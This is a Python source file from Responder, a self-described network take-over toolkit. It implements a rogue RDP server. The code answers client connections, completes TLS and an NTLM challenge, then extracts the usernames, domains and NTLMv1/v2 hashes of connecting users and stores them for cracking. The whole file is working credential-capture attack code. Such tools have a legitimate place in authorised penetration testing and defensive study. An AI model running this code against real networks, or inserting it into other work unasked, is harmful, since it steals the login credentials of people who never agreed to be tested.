#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from responder.src.utils import *
from responder.src import settings
import struct
import re
import ssl
import codecs
from pathlib import Path

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler

from responder.src.packets import TPKT, X224, RDPNEGOAnswer, RDPNTLMChallengeAnswer

# Use resolved SSL certificate paths from settings
cert = settings.Config.SSLCert
key = settings.Config.SSLKey


def ParseNTLMHash(data, client, Challenge):  # Parse NTLMSSP v1/v2
    SSPIStart = data.find(b"NTLMSSP")
    SSPIString = data[SSPIStart:]
    LMhashLen = struct.unpack("<H", data[SSPIStart + 14 : SSPIStart + 16])[0]
    LMhashOffset = struct.unpack("<H", data[SSPIStart + 16 : SSPIStart + 18])[0]
    LMHash = SSPIString[LMhashOffset : LMhashOffset + LMhashLen]
    LMHash = codecs.encode(LMHash, "hex").upper().decode("latin-1")
    NthashLen = struct.unpack("<H", data[SSPIStart + 20 : SSPIStart + 22])[0]
    NthashOffset = struct.unpack("<H", data[SSPIStart + 24 : SSPIStart + 26])[0]

    if NthashLen == 24:
        SMBHash = SSPIString[NthashOffset : NthashOffset + NthashLen]
        SMBHash = codecs.encode(SMBHash, "hex").upper().decode("latin-1")
        DomainLen = struct.unpack("<H", SSPIString[30:32])[0]
        DomainOffset = struct.unpack("<H", SSPIString[32:34])[0]
        Domain = SSPIString[DomainOffset : DomainOffset + DomainLen].decode("UTF-16LE")
        UserLen = struct.unpack("<H", SSPIString[38:40])[0]
        UserOffset = struct.unpack("<H", SSPIString[40:42])[0]
        Username = SSPIString[UserOffset : UserOffset + UserLen].decode("UTF-16LE")
        WriteHash = "%s::%s:%s:%s:%s" % (
            Username,
            Domain,
            LMHash,
            SMBHash,
            codecs.encode(Challenge, "hex").decode("latin-1"),
        )

        SaveToDb(
            {
                "module": "RDP",
                "type": "NTLMv1-SSP",
                "client": client,
                "user": Domain + "\\" + Username,
                "hash": SMBHash,
                "fullhash": WriteHash,
            }
        )

    if NthashLen > 60:
        SMBHash = SSPIString[NthashOffset : NthashOffset + NthashLen]
        SMBHash = codecs.encode(SMBHash, "hex").upper().decode("latin-1")
        DomainLen = struct.unpack("<H", SSPIString[30:32])[0]
        DomainOffset = struct.unpack("<H", SSPIString[32:34])[0]
        Domain = SSPIString[DomainOffset : DomainOffset + DomainLen].decode("UTF-16LE")
        UserLen = struct.unpack("<H", SSPIString[38:40])[0]
        UserOffset = struct.unpack("<H", SSPIString[40:42])[0]
        Username = SSPIString[UserOffset : UserOffset + UserLen].decode("UTF-16LE")
        WriteHash = "%s::%s:%s:%s:%s" % (
            Username,
            Domain,
            codecs.encode(Challenge, "hex").decode("latin-1"),
            SMBHash[:32],
            SMBHash[32:],
        )

        SaveToDb(
            {
                "module": "RDP",
                "type": "NTLMv2-SSP",
                "client": client,
                "user": Domain + "\\" + Username,
                "hash": SMBHash,
                "fullhash": WriteHash,
            }
        )


def FindNTLMNegoStep(data):
    NTLMStart = data.find(b"NTLMSSP")
    NTLMString = data[NTLMStart:]
    NTLMStep = NTLMString[8:12]
    if NTLMStep == b"\x01\x00\x00\x00":
        return NTLMStep
    if NTLMStep == b"\x03\x00\x00\x00":
        return NTLMStep
    else:
        return False


class RDP(BaseRequestHandler):
    def handle(self):
        try:
            data = self.request.recv(1024)
            self.request.settimeout(30)
            Challenge = RandomChallenge()

            # Use the already computed cert and key paths
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert, key)

            if data[11:12] == b"\x01":
                x = X224(Data=RDPNEGOAnswer())
                x.calculate()
                h = TPKT(Data=x)
                h.calculate()
                buffer1 = str(h)
                self.request.send(NetworkSendBufferPython2or3(buffer1))
                SSLsock = context.wrap_socket(self.request, server_side=True)
                SSLsock.settimeout(30)
                data = SSLsock.read(8092)
                if FindNTLMNegoStep(data) == b"\x01\x00\x00\x00":
                    x = RDPNTLMChallengeAnswer(
                        NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge)
                    )
                    x.calculate()
                    SSLsock.write(NetworkSendBufferPython2or3(x))
                    data = SSLsock.read(8092)
                    if FindNTLMNegoStep(data) == b"\x03\x00\x00\x00":
                        ParseNTLMHash(data, self.client_address[0], Challenge)

            ##Sometimes a client sends a routing cookie; we don't want to miss that let's look at it the other way around..
            if data[len(data) - 4 :] == b"\x03\x00\x00\x00":
                x = X224(Data=RDPNEGOAnswer())
                x.calculate()
                h = TPKT(Data=x)
                h.calculate()
                buffer1 = str(h)
                self.request.send(NetworkSendBufferPython2or3(buffer1))
                data = self.request.recv(8092)
                SSLsock = context.wrap_socket(self.request, server_side=True)
                data = SSLsock.read(8092)
                if FindNTLMNegoStep(data) == b"\x01\x00\x00\x00":
                    x = RDPNTLMChallengeAnswer(
                        NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge)
                    )
                    x.calculate()
                    SSLsock.write(NetworkSendBufferPython2or3(x))
                    data = SSLsock.read(8092)
                    if FindNTLMNegoStep(data) == b"\x03\x00\x00\x00":
                        ParseNTLMHash(data, self.client_address[0], Challenge)

            else:
                return False
        except:
            pass
